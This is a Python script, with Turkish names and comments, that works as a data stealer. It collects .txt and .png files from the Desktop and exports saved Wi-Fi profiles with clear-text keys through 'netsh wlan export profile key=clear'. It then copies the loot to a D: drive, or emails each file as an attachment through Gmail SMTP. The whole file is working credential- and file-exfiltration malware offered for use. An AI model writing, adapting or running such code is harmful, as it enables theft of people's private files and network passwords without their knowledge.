import os
import re
import ssl
import smtplib
import subprocess

from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import time
import shutil
import socket


sonlar = [".txt", ".png", ".jpg", ".mp4", ".mp3"]

def check_network():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

def gönder_txt():
    #bilgilerim
    try:
        for root,dirs,files, in os.walk("./Desktop"):
            for name in files:
                dosya_bitisi = name.endswith(sonlar[0])
                if dosya_bitisi:
                    print(os.path.join(root, name))
                    bulunan = os.path.join(root,name)
                    time.sleep(0.1)
                    if os.path.exists("D://"):
                        shutil.copy(bulunan, 'D://txtFile')
                    else:
                        print("Disk Bulunamadı")
                    #eposta
                    kullanici = "gmail"
                    sifre = "gmail api gey example(tgqb nfgq txol jaje)"

                    context = ssl.create_default_context()
                       # E-posta konu ve içeriği
                    alici = kullanici
                    baslik = 'Txtler Geldi'
                    mesaj = "Gerçek Dosya İsmi: "+ bulunan
                    posta = MIMEMultipart()
                    posta['From'] = kullanici
                    posta['To'] = kullanici
                    posta['Subject'] = baslik
                    
                    posta.attach(MIMEText(mesaj, 'plain'))

                    try:
                        eklenti_dosya_ismi = bulunan
                        with(open(eklenti_dosya_ismi, 'rb')) as eklenti_dosyasi:
                            payload = MIMEBase('application', 'octate-stream')
                            payload.set_payload((eklenti_dosyasi).read())
                            encoders.encode_base64(payload)

                            payload.add_header("Content-Decomposition", "attachment", filename = eklenti_dosya_ismi)
                            posta.attach(payload)

                            posta_str = posta.as_string()
                    #port ayarları
                        port = 465 
                        host = "smtp.gmail.com"
                        
                        
                        eposta_sunucu= smtplib.SMTP_SSL(host= host, port=port, context= context)
                        eposta_sunucu.login(kullanici, sifre)
                        eposta_sunucu.sendmail(kullanici, alici, posta_str)

                    except Exception as e:
                        print(f"E-posta gönderme hatası: {e}")
    except FileNotFoundError:
        print("Dosya Bulunamadı")

def gönder_png():
    try:
        for root,dirs,files, in os.walk("./Desktop"):
            for name in files:
                dosya_bitisi = name.endswith(sonlar [1])
                if dosya_bitisi:
                    print(os.path.join(root, name))
                    bulunan = os.path.join(root, name)
                    time.sleep(0.1)
                    if os.path.exists("D://"):
                        shutil.copy(bulunan, "D://pngFile")
                    else:
                        print(" 'D://' Disk Bulunamadı")
                    
                    #eposta
                    kullanici = "gmail"
                    sifre = "gmail api key example(tgqb nfgq txol jaje)"

                    context = ssl.create_default_context()
                    #eposta gönderim bilgileri
                    alici = kullanici
                    baslik = "Pngler Geldi"
                    mesaj = "Gerçek Dosya İsmi:" + bulunan
                    posta = MIMEMultipart()
                    posta['From'] = kullanici
                    posta['To'] = kullanici
                    posta['Subject'] = baslik

                    posta.attach(MIMEText(mesaj, 'plain'))

                    try:
                        eklenti_dosya_ismi = bulunan
                        with(open(eklenti_dosya_ismi, 'rb')) as eklenti_dosyasi:
                            payload = MIMEBase('application', 'octet-stream')
                            payload.set_payload((eklenti_dosyasi).read())
                            encoders.encode_base64(payload)

                            payload.add_header("Content-Decomposition", "attachment", filename = eklenti_dosya_ismi)
                            posta.attach(payload)
                            posta_str = posta.as_string()
                            
                            #sunucu/port ayarları
                            port = 465
                            host = "smtp.gmail.com"

                            eposta_sunucu = smtplib.SMTP_SSL(host= host, port= port, context= context)
                            eposta_sunucu.login(kullanici, sifre)
                            eposta_sunucu.sendmail(kullanici, alici, posta_str)

                    except Exception as e:
                        print(f"E-posta gönderme hatası: {e}")
    except FileNotFoundError:
        print("Dosya Bulunamadı")
        
    
                
#ofline işlemler
def kopyala_txt():
    try:
        for root,dirs,files, in os.walk("./Desktop"):
            for name in files:
                dosya_bitisi = name.endswith(".txt")
                if dosya_bitisi:
                    print(os.path.join(root, name))
                    bulunan = os.path.join(root,name)
                    shutil.copy(bulunan, 'D://txtFile')
    except FileNotFoundError:
        print("Dosya Bulunamadı")

def kopyala_png():
    try:
        for root,dirs,files, in os.walk("./Desktop"):
            for name in files:
                dosya_bitisi = name.endswith(".png")
                if dosya_bitisi:
                    print(os.path.join(root, name))
                    bulunan = os.path.join(root, name)
                    shutil.copy(bulunan, "D://pngFile")
                    time.sleep(0.1)
    except FileNotFoundError:
        print("Dosya Bulunamadı")
    
def internet_passw():
    intyol = 'C:\\sabsloutesaber'
    try:
        os.mkdir(intyol)
        print(f"Dosya Oluşturuldu: {intyol}")
    except FileExistsError:
        print("Dosya zaten mevcut")

    a = subprocess.getoutput("netsh wlan export profile folder=C:\\sabsloutesaber key=clear")
    
    for root,dirs,files, in os.walk("C://sabsloutesaber"):
        for name in files:
            dosya_bitisi = name.endswith(".xml")
            if dosya_bitisi:
                print(os.path.join(root, name))
                bulunan = os.path.join(root, name)

                kullanici = "gmail"
                sifre = "gmail api gey example(tgqb nfgq txol jaje)"

                context = ssl.create_default_context()
                #eposta gönderim bilgileri
                alici = kullanici
                baslik = "İnternet Bilgileri"
                mesaj = "Dosya İsmi (sonu xml):" + bulunan
                posta = MIMEMultipart()
                posta['From'] = kullanici
                posta['To'] = kullanici
                posta['Subject'] = baslik
                posta.attach(MIMEText(mesaj, 'plain'))

                try:
                    eklenti_dosya_ismi = bulunan
                    with(open(eklenti_dosya_ismi, 'rb')) as eklenti_dosyasi:
                        payload = MIMEBase('application', 'octet-stream')
                        payload.set_payload((eklenti_dosyasi).read())
                        encoders.encode_base64(payload)

                        payload.add_header("Content-Decomposition", "attachment", filename = eklenti_dosya_ismi)
                        posta.attach(payload)
                        posta_str = posta.as_string()
                                        
                        #sunucu/port ayarları
                        port = 465
                        host = "smtp.gmail.com"

                        eposta_sunucu = smtplib.SMTP_SSL(host= host, port= port, context= context)
                        eposta_sunucu.login(kullanici, sifre)
                        eposta_sunucu.sendmail(kullanici, alici, posta_str)

                except Exception as e:
                        print(f"E-posta gönderme hatası: {e}")
                except FileNotFoundError:
                    print("Dosya Bulunamadı")

if check_network() == True:
    print("İnternet Bağlantısı Var")
    if os.path.exists("D://"):
        print("D Disk Bulunmaktadır")
        print(subprocess.getoutput("netsh wlan export profile folder=D:\\wifi\ key=clear"))
        kopyala_txt()
        kopyala_png()
    else:
        print("D Disk Bulunmamaktadır E-Posta Yolu İle Gönderiliyor İşlem Biraz Daha Uzun Sürecektir")
        internet_passw()
        gönder_txt()
        gönder_png()
        
    
else:
    print("İnternet Bağlantısı Yok")
    if os.path.exists("D://"):
        print(subprocess.getoutput("netsh wlan export profile folder=D:\\wifi\ key=clear"))
        kopyala_txt()
        kopyala_png()
    else:
        print("Aygıt Bulunamadı")
